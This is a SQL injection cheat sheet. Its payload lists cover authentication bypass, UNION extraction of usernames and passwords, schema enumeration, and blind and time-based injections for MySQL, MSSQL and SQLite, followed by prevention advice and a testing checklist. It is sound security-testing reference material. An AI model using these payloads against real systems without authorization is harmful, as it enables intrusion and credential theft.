# SQL Injection Cheat Sheet

## Overview
SQL Injection (SQLi) occurs when user input is improperly sanitized and concatenated into SQL queries, allowing an attacker to alter query logic.

## Detection
- **Error-based**: Submit a single quote (`'`) and look for SQL syntax errors.
- **Boolean-based**: Inject conditions that change page behavior (true/false).
- **Time-based**: Use sleep/delay functions to infer truth via timing.
- **Union-based**: Attempt to append `UNION SELECT NULL,...` to extract data.

## Common Payloads
### Authentication Bypass
```
' OR '1'='1
' OR 1=1--
" OR ""="
admin' --
```

### Union Based (determine columns)
```
' ORDER BY 1--
' ORDER BY 2--
...
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### Data Extraction
```
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind Boolean
```
' AND (SELECT SUBSTRING(password,1,1)='a' FROM users LIMIT 1)--
```

### Time Based (MySQL)
```
' AND IF(1=1,SLEEP(5),0)--
```

### SQLite Specific
```
' || (SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1) ||'
```

### MSSQL Specific
```
'; IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 WAITFOR DELAY '00:00:05'--
```

## Prevention
- **Parameterized Queries / Prepared Statements** (preferred).
- **Input Validation**: Whitelist allowed characters.
- **Escaping**: Use library-specific escape functions (less reliable).
- **Least Privilege**: DB user should have only needed permissions.
- **Web Application Firewall (WAF)**: Can block obvious patterns but not a substitute for proper coding.

## Testing Checklist
- [ ] Test every parameter (GET, POST, Header, Cookie).
- [ ] Try classic payloads (`'`, `"`, `--`, `;`, `/*`, `*/`).
- [ ] Look for differences in response (length, status, presence/absence of strings).
- [ ] Use automated tools (sqlmap) for confirmation but verify manually.
- [ ] Check for second‑order injection (data stored then later used).

## Resources
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Web Security Academy: https://portswigger.net/web-security/sql-injection
- SQLi Payloads: https://github.com/payloadbox/sql-injection-payload-list